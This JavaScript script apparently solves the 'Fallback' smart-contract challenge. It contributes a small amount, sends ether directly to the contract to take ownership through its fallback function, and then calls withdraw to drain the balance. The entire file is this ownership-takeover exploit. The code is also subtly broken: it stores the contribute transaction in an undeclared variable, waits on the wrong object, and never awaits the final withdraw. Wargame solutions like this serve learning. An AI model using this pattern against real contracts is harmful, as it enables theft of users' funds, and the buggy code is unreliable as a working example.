const main = async () => {
  const [signer] = await ethers.getSigners();
  let contract = await getContract(signer);

  let txn = await contract.getContribution();
  if (Number(txn) === 0) {
    console.log('No contribution yet');
    stxn = await contract.contribute({
      value: ethers.utils.parseEther('0.0001'),
    });
    txn.wait();
  }
  contract = await getContract(signer);
  txn = await contract.getContribution();
  console.log(Number(txn));
  console.log('Sending txn');
  txn = await signer.sendTransaction({
    to: '0x9907b47821Fc6e4EE0b81eb33DBdc30E8A7AA15a',
    value: ethers.utils.parseEther('0.01'),
    gasLimit: 250000,
  });
  await txn.wait();
  contract = await getContract(signer);
  console.log(await contract.owner());
  txn = await contract.withdraw();
};

const getContract = async (signer) => {
  const contractFactory = await ethers.getContractFactory('Fallback');
  let contract = await contractFactory.attach(
    '0x9907b47821Fc6e4EE0b81eb33DBdc30E8A7AA15a'
  );
  let contractSigner = await contract.connect(signer);
  return contractSigner;
};

const runMain = async () => {
  try {
    await main();
    process.exit(0);
  } catch (e) {
    console.log(e);
    process.exit(1);
  }
};
runMain();
